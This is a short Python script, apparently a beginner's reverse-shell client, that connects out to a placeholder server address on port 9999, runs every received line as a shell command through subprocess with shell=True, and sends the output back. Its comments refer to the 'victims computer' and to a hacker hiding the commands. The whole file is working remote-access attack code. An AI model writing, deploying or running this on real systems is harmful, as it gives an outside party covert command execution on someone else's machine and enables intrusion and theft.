import socket
import os
import subprocess
from sys import stderr
#subprocess is the proccess that exist on the windows computer

s= socket.socket()
host = "server ip" 
#ipadrss of the server
port = 9999

s.connect((host,port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") =="cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd= subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        #popen open the cmd then it execute command and shell = true can give permission to execute shell commands
        
        output_byte= cmd.stdout.read() + cmd.stderr.read()
        output_str= str(output_byte,"utf-8")
        currentWD= os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

    #now there are things of displaying command into victims computer it upto you if you are hacker you can hide your command but if you are do right things then you must display command you are writing into victims computer. im printing
    print(output_str)
    
